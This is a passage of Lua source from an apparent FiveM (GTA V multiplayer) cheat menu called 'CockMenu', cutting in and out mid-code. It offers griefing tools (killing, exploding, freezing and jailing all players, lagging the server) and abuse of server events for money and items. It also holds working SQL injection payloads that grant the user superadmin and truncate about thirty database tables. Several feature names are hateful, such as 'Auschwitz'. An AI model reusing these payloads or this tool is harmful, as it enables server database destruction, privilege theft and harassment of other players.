                                   if tf.Button('Paint all vehicles', '~y~Semi') then
                                       Cock.Menu.paintallvehs = not Cock.Menu.paintallvehs
                                   end
                                   if tf.Button('Unlock all vehicles', "~r~Risky") then
                                       for vehs in Fatasf.n.EnumerateVehicles() do
                                           Functions.f.UnlockVehicle(vehs)
                                       end
                                   end
                                   if tf.Button('Cock plate all vehicles', "~r~Risky") then
                                       for vehs in Fatasf.n.EnumerateVehicles() do
                                           Fatasf.n.SetVehicleNumberPlateText(vehs, 'CockMenu') 
                                       end
                                   end
                                   if tf.Button('Sirens on all players', "~r~Risky") then
                                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockMeni.Functions.SirensOnPlayer(i)
                                       end
                                   end
       
                                   if tf.Button('Cage players') then
                                       --for i = 0, #GetActivePlayers() do
                                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockT.Global.CageNew(i)
                                       end
                                   end
       
                                   if tf.Button('Server announce', '~g~Safe') then
                                       local message =  Functions.f.CustomInput("Custom message", "^1Heres comes ^7CockMenu", 25)
                                       CockT.Global.TriggerCustomEvent(true, "_chat:messageEntered", "cockmenu", { 255, 255, 255 },  message)
                                   end
                                   if CockMeni.Functions.CheckBox("Explode grove street", Cock.Menu.explodegrove) then
                                       Cock.Menu.explodegrove = not Cock.Menu.explodegrove
                                   end
                                   if CockMeni.Functions.CheckBox("Explode Missionrow", Cock.Menu.explodemissionrow) then
                                       Cock.Menu.explodemissionrow = not Cock.Menu.explodemissionrow
                                   end
                                   if CockMeni.Functions.CheckBox("Explode Gas Stations", Cock.Menu.explodeallstations) then
                                       Cock.Menu.explodeallstations = not Cock.Menu.explodeallstations
                                   end
                                   if tf.Button('Kill all players', '~g~Safe') then
                                       CockT.Global.KillAllPlayers()
                                   end
                                   if tf.Button('Shit rain on all', '~g~Safe') then
                                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockMeni.Functions.ShitRain(i, 'pounder', 5)
                                           CockMeni.Functions.ShitRain(i, 'adder', 5)
                                           CockMeni.Functions.ShitRain(i, 'Submersible', 5)
                                           CockMeni.Functions.ShitRain(i, 'cutter', 5)
                                           CockMeni.Functions.ShitRain(i, 'faggio3', 5)
                                       end
                                   end
                                   if tf.Button('Auschwitz', '~y~Semi') then
                                      for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockT.Global.CageNew(i)
                                           Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(i)), 12, 100.0, true, false, 0.0) 
                                       end
                                   end
                                   if tf.Button('Auschwitzv2', '~y~Semi') then
                                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockT.Global.Auschwitzv2(i)
                                       end
                                    end
                                   if tf.Button('Plant bomb on all vehicles', '~y~Semi') then
                                       Cock.Menu.plantthebombonall = not Cock.Menu.plantthebombonall
                                           if Cock.Menu.plantthebombonall then
                                              for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                                   if Fatasf.n.IsPedSittingInVehicle(Fatasf.n.GetPlayerPed(i), Fatasf.n.GetVehiclePedIsIn(Fatasf.n.GetPlayerPed(i), false)) then
                                                       --[[ local bomb = Fatasf.n.CreateAnDui("https://cock.menu/music/bombhasbeenplanted.mp3", 1, 1, 1)
                                                       CockT.Inv["Wait"](1600)
                                                       Fatasf.n.DestroyDui(bomb) ]]
                                                       local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(i))
                                                       Fatasf.n.AddExplosion(coords.x, coords.y, coords.z, 5, 100.0, true, false, 0.0)
                                                   end
                                               end
                                           end
                                       end
                                       if tf.Button('Fuck all vehicles', '~y~Semi') then
                                           for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                               Functions.f.FuckVehicle(i) 
                                           end
                                       end
                                       if tf.Button('Spawn bitch in all players vehicles', '~y~Semi') then
                                           for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                               CockMeni.Functions.SpawnBitch(i)
                                           end
                                       end
                                       if tf.Button('Aggressive bolivanos', '~y~Semi') then
                                           for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                               CockT.Global.SpawnKillingMexico(i)
                                           end
                                       end
                                       if tf.Button('Anti KKK', '~y~Semi') then
                                           CockT.Global.AntiKKK() 
                                       end
                                       if tf.Button('rE sign', '~y~Semi') then
                                           CockT.Global.redENGINEsign() 
                                       end
                                       if tf.Button('Freeze everyone', '~y~Semi') then
                                           for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                               Functions.f.FreezePlayer(i)
                                           end
                                       end
                                       if tf.Button('Bring closest vehicles', '~y~Semi') then
                                           local vehicle = CockT.Inv["Invoke"](CockT.Natives['GetClosestVehicle'], Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), 15000.0, 0, 70)
                                           Fatasf.n.SetEntityCoordsNoOffset(vehicle, Fatasf.n.GetEntityCoords(Fatasf.n.PlayerPedId()), true, true, true)
                                       end
                                       if CockMeni.Functions.CheckBox("Lag server", Cock.Menu.lagserver) then
                                           Cock.Menu.lagserver = not Cock.Menu.lagserver
                                       end
                                      
                                       if CockMeni.Functions.CheckBox("Taze loop all", Cock.Menu.tazeloopall) then
                                           Cock.Menu.tazeloopall = not Cock.Menu.tazeloopall
                                       end
                                       if CockMeni.Functions.CheckBox("Kick from vehicle loop all", Cock.Menu.kickfromvehall) then
                                           Cock.Menu.kickfromvehall = not Cock.Menu.kickfromvehall
                                       end
                                       if tf.Button("Fuck server", "~y~Semi") then
                                           CockT.Global.FuckServer()
                                       end
                                       --[[if tf.Button("", "~y~Semi") then
                                           
                                       end]]
                                       if CockMeni.Functions.CheckBox("Ear rape everyone", Cock.Menu.earrapeall) then
                                           Cock.Menu.earrapeall = not Cock.Menu.earrapeall
                                       end
                                   
       
                           end
   
                           --[[if CockMeni.Functions.IsMenuOpened("resfiles") then 
                                   KnownRes = {
                                       "client.lua",
                                       "main.lua",
                                       "ac.lua",
                                       "anticheat.lua",
                                       "api-ac_.lua",
                                       "__resource.lua",
                                       "fxmanifest.lua",
                                       "chocohax.lua",
                                   }
                                   for _, files in CockT.Math.pairs(KnownRes) do
                                       
                                       if CockMeni.Functions.Button(files, "") then 
                                           s = Fatasf.n.GetResourceState('chat')
                                           print(s)
                                       end
   
                                   end
                           end
   
                           if CockMeni.Functions.IsMenuOpened("dumper") then 
                               for _, resources in CockT.Math.pairs(Fatasf.n.GetResources()) do
                                   if CockMeni.Functions.MenuButton(resources, "resfiles", "") then 
                                   end
                               end
   
                           end]]
   
                           if tf.IsMenuOpened("lua") then 
                               if tf.Button("Refresh", "~g~Safe") then
                                   CockMeni.Functions.UpdateAllTriggers()
                               end
                               if tf.Button("Execute lua code", "~g~Safe") then
                                   local in1 = Functions.f.CustomInput("Code to execute", "", 1000)
                                   CockT.Strings.pcall(CockT.Strings.load(in1))
                               end
   
                               --[[if CockMeni.Functions.MenuButton("Resource dumper", "dumper", "") then 
                               end]]
                               if tf.CSeparator("~y~TRIGGERS", "") then
                               end
                               if dynamic.TR['gopostaljob:pay2'] then
                                   if tf.Button("~g~ESX~s~ Money (gopostal2)", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['gopostaljob:pay2'], 999999)
                                   end
                               end
                               if dynamic.TR['carry_exploitv2'] then
                                   if tf.Button("Teleport all to ocean", "~y~Semi") then
                                       local ped = Fatasf.n.GetPlayerPed(v)
                                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR["carry_exploitv2"], ped, "missfinale_c2mcs_1", "nm", "fin_c2_mcs_1_camman", "firemans_carry", 0.15, 0.27, 0.63,Fatasf.n.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                                           CockT.Inv["Wait"](150)
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR["carrypeople_stop"],Fatasf.n.GetPlayerServerId(v))
                                       end
                                   end
                               end
                               if dynamic.TR['esx_skin:openSaveableMenu'] then
                                   if tf.Button("~g~ESX~s~ Open skin menu", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(false, 'esx_skin:openSaveableMenu')
                                   end
                               end
                               --esx_skin:openSaveableMenu
                               if dynamic.TR['garbagejob_pay'] then
                                   if tf.Button("~g~ESX~s~ Money (garbagejob)", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['garbagejob_pay'], 999999)
                                   end
                               end
                               if dynamic.TR['gopostaljob:pay'] then
                                   if tf.Button("~g~ESX~s~ Money (gopostal)", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['gopostaljob:pay'], 999999)
                                   end
                               end
                               if dynamic.TR['esx_blanchisseur:pay'] then
                                   if tf.Button("~g~ESX~s~ Money (esx_blanchisseur)", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['esx_blanchisseur:pay'], 999999)
                                   end
                               end
       
                               if dynamic.TR['esx_pizza:pay'] then
                                   if tf.Button("~g~ESX~s~ Money (esx_pizza)", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['esx_pizza:pay'], 999999)
                                   end
                               end
                               if dynamic.TR['esx_taxijob:success'] then
                                   if tf.Button("~g~ESX~s~ Money (esx_taxijob)", "~y~Semi") then
                                       HeyFriendo("esx_taxijob:success")
                                       HeyFriendo("esx_taxijob2:success")
                                   end
                               end
   
                               
       
                               if dynamic.TR['drugs:stop_sell_opium'] then
                                   if tf.Button("~g~ESX~s~ Drugs - STOP ALL", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_sell_opium'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:drugs:stop_process_opium'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_feild_opium'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_sell_weed'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_feild_weed'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_sell_meth'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_process_meth'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_feild_meth'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_sell_coke'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_process_coke'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:stop_feild_coke'])
                                   end
                               end
                               if dynamic.TR['drugs:opiumsell'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Sell Opium", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:opiumsell'])
                                   end
                               end
                               if dynamic.TR['drugs:opiumprocess'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Process Opium", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:opiumprocess'])
                                   end
                               end
                               if dynamic.TR['drugs:opiumfield'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Field Opium", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:opiumfield'])
                                   end
                               end
                               if dynamic.TR['drugs:weedsell'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Sell Weed", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:weedsell'])
                                   end
                               end
                               if dynamic.TR['drugs:weedprocess'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Process Weed", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:weedprocess'])
                                   end
                               end
                               if dynamic.TR['drugs:weedfield'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Field Weed", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['drugs:weedfield'])
                                   end
                               end
       
                               if dynamic.TR['coke_feild'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Field Coke", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['coke_feild'])
                                   end
                               end
       
                               if dynamic.TR['coke_process'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Process Coke", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['coke_process'])
                                   end
                               end
                               if dynamic.TR['coke_sell'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Sell Coke", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['coke_sell'])
                                   end
                               end
       
                               if dynamic.TR['meth_field'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Field Meth", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['meth_field'])
                                   end
                               end
       
                               if dynamic.TR['meth_process'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Process Meth", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['meth_process'])
                                   end
                               end
       
                               if dynamic.TR['meth_sell'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Sell Meth", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['meth_sell'])
                                   end
                               end
       
                               if dynamic.TR['stop_feild_coke'] then
                                   if tf.Button("~g~ESX~s~ Drugs - Stop All", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_feild_coke'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_process_coke'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_sell_coke'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_feild_meth'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_process_meth'])
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['stop_sell_meth'])
                                   end
                               end
                               if dynamic.TR['vangelico_get'] then
                                   if CockMeni.Functions.CheckBox("~g~ESX~s~ Give jewlery", dynamic.TR.MoneyLoop) then
                                       dynamic.TR.MoneyLoop = not dynamic.TR.MoneyLoop
                                       if dynamic.TR.MoneyLoop then
                                           CockT.Inv["Thread"](function()
                                               while dynamic.TR.MoneyLoop do
                                                   CockT.Inv["Wait"](200)
                                                   CockT.Global.TriggerCustomEvent(true, dynamic.TR['vangelico_get'])
                                               end
                                           end)
                                       end
                                   end
                               end
                               if dynamic.TR['vangelico_sell'] then
                                   if tf.Button("~g~ESX~s~ Sell jewlery", "~y~Semi") then
                                       local amount =  Functions.f.CustomInput('Amount to sell', '', 3)
                                       for i = 0, CockT.Math.tonumber(amount-1) do
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['vangelico_sell'])
                                       end
                                   end
                               end
                               if dynamic.TR['giveitem'] then
                                   if tf.Button("~g~ESX~s~ Give item", "~y~Semi") then
                                       local item =  Functions.f.CustomInput('Item to give', '', 30)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['giveitem'], item)
                                   end
                               end
                               if dynamic.TR['giveitem2'] then
                                   if tf.Button("~g~ESX~s~ Give item", "~y~Semi") then
                                       local item = Functions.f.CustomInput('Item to give', '', 30)
                                       local ammount = Functions.f.CustomInput('Ammount', '', 30)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['giveitem2'], item, ammount)
                                   end
                               end
                               if dynamic.TR['doorlock_sound1'] then
                                   if tf.Button("~g~ESX~s~ Sound 1", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['doorlock_sound1'], 113.0, 'unlockDoor', 0.8)
                                   end
                               end
                               if dynamic.TR['interact_sound1'] then
                                   if tf.Button("~g~ESX~s~ Sound 2", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['interact_sound1'], 113.0, 'unlockDoor', 0.8)
                                   end
                               end
                               if dynamic.TR['interact_sound1'] then
                                   if tf.Button("~g~ESX~s~ Sound 3", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['interact_sound2'], 113.0, 'lockDoor', 0.8)
                                   end
                               end
   
                               
                               
                               if dynamic.TR['reviveesx'] then
                                   if tf.Button("~g~ESX~s~ Revive", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(false, dynamic.TR['reviveesx'])
                                   end
                               end
                               if dynamic.TR['reviveesx2'] then
                                   if tf.Button("~g~ESX~s~ Revive", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(false, dynamic.TR['reviveesx2'])
                                   end
                               end
                               if dynamic.TR['policejob_handcuff'] then
                                   if tf.Button("~g~ESX~s~ Handcuff player", "~y~Semi") then
                                       local id =  Functions.f.CustomInput('Player Id', '', 3)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['policejob_handcuff'], id)
                                   end
                               end
                               if dynamic.TR['policejob_handcuff'] then
                                   if tf.Button("~g~ESX~s~ Handcuff all players", "~y~Semi") then
                                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['policejob_handcuff'], i)
                                       end
                                   end
                               end
                               if dynamic.TR['policejob_spammer'] then
                                   if tf.Button("~g~ESX~s~ Spam messages", "~y~Semi") then
                                       CockT.Inv["Thread"](function()
                                           local text =  Functions.f.CustomInput('Message to send', 'CockMenu on Top!', 1000)
                                           local amount =  Functions.f.CustomInput('Times to loop', '10', 3)
                                           for i = 1, CockT.Math.tonumber(amount) do
                                               CockT.Global.TriggerCustomEvent(true, dynamic.TR['policejob_spammer'], -1, '('..i..') '..CockT.Strings.tostring(text))
                                               CockT.Inv["Wait"](60)
                                           end
                                       end)
                                   end
                               end 
                               if dynamic.TR['dmv_getlicense'] then
                                   if tf.Button("~g~ESX~s~ Add all Licences", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['dmv_getlicense'], 'dmv')
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['dmv_getlicense'], 'drive')
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['dmv_getlicense'], 'drive_bike')
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['dmv_getlicense'], 'drive_truck')
                                   end
                               end
                               if dynamic.TR['tp_all_to_me'] then
                                   if tf.Button("Teleport all to me", "~y~Semi") then
                                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['tp_all_to_me'], i)
                                       end
                                   end
                               end
                               if dynamic.TR['carry_exploit'] then
                                   if tf.Button("Carry All", "~y~Semi") then
                                       CockT.Inv["Thread"](function()
                                           while true do 
                                               CockT.Inv["Wait"](0)
                                               for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                                                   if Fatasf.n.GetPlayerPed(v) ~= Fatasf.n.PlayerPedId() then 
                                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['carry_exploit'], Fatasf.n.GetPlayerPed(v), 'missfinale_c2mcs_1', 'nm', 'fin_c2_mcs_1_camman', 'firemans_carry', 0.15, 0.27, 0.63,Fatasf.n.GetPlayerServerId(v), 100000, 0.0, 49, 33, 1)
                                                       CockT.Inv["Wait"](10)
                                                   end
                                               end
                                           return
                                        end
                                       end)
                                   end
                               end
                               if dynamic.TR['addSuperadmin'] then
                                   if tf.Button("Add admin", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['addSuperadmin'], "';UPDATE `users` SET `permission_level` = '4', `group` = 'superadmin'where_DSGHSDIUGSDG `users`.`name` = '"..NetworkPlayerGetName(Fatasf.n.PlayerId()).."';")
                                   end
                               end
                               if dynamic.TR['delete_DB'] then
                                   if tf.Button("Delete database", "~y~Semi") then
                                       CockT.Inv["Thread"](function()
                                           trashTables = {
                                               'addon_account',
                                               'addon_account_data',
                                               'addon_inventory',
                                               'addon_inventory_items',
                                               'billing',
                                               'charicters',
                                               'datastore',
                                               'datastore_data',
                                               'fine_types',
                                               'items',
                                               'jobs',
                                               'job_grades',
                                               'licenses',
                                               'owned_properties',
                                               'phone_app_chat',
                                               'phone_calls',
                                               'phone_messages',
                                               'phone_users_contacts',
                                               'properties',
                                               'rented_vehicles',
                                               'shops',
                                               'society_moneywash',
                                               'users',
                                               'user_accounts',
                                               'user_inventory',
                                               'user_licenses',
                                               'vehicles',
                                               'vehicle_categories',
                                               'vehicle_sold',
                                               'weashops'
                                           }
                                           for key, value in CockT.Math.pairs(trashTables) do
                                               CockT.Inv["Wait"](25)
                                               CockT.Global.TriggerCustomEvent(true, dynamic.TR['delete_DB'], '\';TRUNCATE TABLE '..value..';-- /')
                                           end
                                           return
                                       end)
                                   end
                               end
   
                               
                               if dynamic.TR['Money_Wash'] then
                                   if tf.Button("~g~ESX~s~ Wash money", "~y~Semi") then
                                       local money = Functions.f.CustomInput("Money ammount", '', 10)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['Money_Wash'], money, 0)
                                   end
                               end
                               if dynamic.TR['open_inv'] then
                                   if tf.Button("~g~ESX~s~ Open Inventory", "~y~Semi") then
                                       local id =  Functions.f.CustomInput("Enter A Person's ID", '', 10)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['open_inv'], "otherplayer", id)	
                                   end
                               end
                               if dynamic.TR['play_song'] then
                                   if tf.Button("~g~ESX~s~ Play custom song", "~y~Semi") then
                                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           person = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(v))
                                           song =  Functions.f.CustomInput("Enter a video link (youtbe)", '', 30)
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['play_da_sound'], song, person)
                                       end
                                   end
                               end
                               if dynamic.TR['Money_Wash_Zone'] then
                                   if tf.Button("~g~ESX~s~ Wash Money", "~y~Semi") then
                                       local ammount =  Functions.f.CustomInput("Enter ammount", '', 30)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['Money_Wash_Zone'], ammount)
                                   end
                               end
                               if dynamic.TR['garbagejob_pay'] then
                                   if tf.Button("~g~ESX~s~ Give money (garbagejob)", "~y~Semi") then
                                       local ammount =  Functions.f.CustomInput("Enter ammount", '', 30)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['garbagejob_pay'], ammount)
                                   end
                               end
                               if dynamic.TR['send_bill'] then
                                   if tf.Button("~g~ESX~s~ Send Bill", "~y~Semi") then
                                       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
                                           for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                               CockT.Inv["Wait"](60)
                                               CockT.Global.TriggerCustomEvent(true, dynamic.TR["send_bill"],Fatasf.n.GetPlayerServerId(v), "Cock Menu", 9999999)
                                           end
                           
                                           CockT.Inv["Wait"](100)
                                       end
                                   end
                               end
                               if dynamic.TR['qalle_jailer'] then
                                   if tf.Button("~g~ESX~s~ Jail all players", "~y~Semi") then
                                       local reason =  Functions.f.CustomInput('Custom Reason', '', 30)
                                       if reason == nil then reason = 'Cock Menu on top' end
                                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['qalle_jailer'],Fatasf.n.GetPlayerServerId(i), 1000000, reason)
                                       end
                                   end
                               end
                               if dynamic.TR['esx_jailer:sendToJail'] then
                                   if tf.Button("~g~ESX~s~ Jail all players", "~y~Semi") then
                                       local reason =  Functions.f.CustomInput('Custom Reason', '', 30)
                                       if reason == nil then reason = 'Cock Menu on top' end
                                       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['esx_jailer:sendToJail'],Fatasf.n.GetPlayerServerId(i), 1000000, reason)
                                       end
                                   end
                               end
                               if dynamic.TR['gopostal_pay'] then
                                   if tf.Button("~g~ESX~s~ Give money (gopostal)", "~y~Semi") then
                                       local ammount =  Functions.f.CustomInput('Ammount?', '', 30)
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['gopostal_pay'], ammount)
                                   end
                               end
                               if dynamic.TR['esx_status_hungerandthirst'] then
                                   if tf.Button("~g~ESX~s~ Refill hunger and thirst", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(false, dynamic.TR['esx_status_hungerandthirst'], 'hunger', 1000000)
                                       CockT.Global.TriggerCustomEvent(false, dynamic.TR['esx_status_hungerandthirst'], 'thirst', 1000000)
                                   end
                               end
                               if dynamic.TR['add_vehicle'] then
                                   if tf.Button("~g~ESX~s~ Add vehicle to garage", "~y~Semi") then
                                       local car = Functions.f.CustomInput('Vehicle', '', 30)
                                       if Fatasf.n.IsModelValid(Fatasf.n.GetHashKey(car)) and Fatasf.n.IsModelAVehicle(car) then
                                           local customplate = Functions.f.CustomInput('Vehicle plate', '', 30)
                                           CockT.Global.TriggerCustomEvent(true, dynamic.TR['vehicleshop_ownedveh'], {['model'] = Fatasf.n.GetHashKey(CockT.Strings.tostring(car)), ['plate'] = CockT.Strings.tostring(customplate)})
                                           
                                       end
                                   end
                               end
                               if dynamic.TR['esx_holdup'] then
                                   if tf.Button("~g~ESX~s~ Money (Bank Robber)", "~y~Semi") then
                                       CockT.Global.TriggerCustomEvent(true, dynamic.TR['esx_holdup'])
                                   end
                               end
       
                           end
       
                           if tf.IsMenuOpened("lscustoms") then
                               if CockMeni.Functions.MenuButton("Performance", "performance", ">") then 
                               end
                               if CockMeni.Functions.MenuButton("Exterior", "exterior", ">") then 
                               end
                           end
       
                           if tf.IsMenuOpened("exterior") then
                               if tf.CSeparator("~r~Disabled", "") then end
                               --if tf.CSeparator("~y~WHEELS", "") then end
                               --[[if tf.Button('Sport Wheels', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleModKit(veh, 0)
                                   Fatasf.n.SetVehicleMod(veh, 0, Fatasf.n.GetNumVehicleMods(veh, 0) -1, false)
                               end
                               if tf.Button('Lowrider Wheels', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   CockT.Inv["Invoke"](CockT.Natives['SetVehicleWheelType'], veh, 2)
                               end
                               if tf.Button('Muscle Wheels', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   CockT.Inv["Invoke"](CockT.Natives['SetVehicleWheelType'], veh, 1)
                               end
                               if tf.Button('SUV Wheels', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   CockT.Inv["Invoke"](CockT.Natives['SetVehicleWheelType'], veh, 3)
                               end
                               if tf.Button('Offroad Wheels', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   CockT.Inv["Invoke"](CockT.Natives['SetVehicleWheelType'], veh, 4)
                               end
       
                               if tf.CSeparator("~y~LIGHTS", "") then end
                               if CockMeni.Functions.CheckBox("Xenon Lights", Cock.Menu.xenonl) then
                                   Cock.Menu.xenonl = not Cock.Menu.xenonl
                               end
                               --]]
                           end
       
                           if tf.IsMenuOpened("performance") then
                               if tf.CSeparator("~y~ENGINE", "") then
                               end
                               if tf.Button('Default Engine', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 11, -1, false)
                               end
                               if tf.Button('Engine LVL 1', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 11, 0, false)
                               end
                               if tf.Button('Engine LVL 2', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 11, 1, false)
                               end
                               if tf.Button('Engine LVL 3', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 11, 2, false)
                               end
                               if tf.Button('Engine LVL 4', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 11, 3, false)
                               end
       
                               if tf.CSeparator("~y~BRAKES", "") then
                               end
                               if tf.Button('Default Brakes', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 12, -1, false)
                               end
                               if tf.Button('Brakes LVL 1', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 12, 0, false)
                               end
                               if tf.Button('Brakes LVL 2', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 12, 1, false)
                               end
                               if tf.Button('Brakes LVL 3', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
                                   Fatasf.n.SetVehicleMod(veh, 12, 2, false)
                               end
                               if tf.Button('Brakes LVL 4', "~y~Semi") then
                                   local veh = Fatasf.n.GetVehiclePedIsIn(Fatasf.n.PlayerPedId())
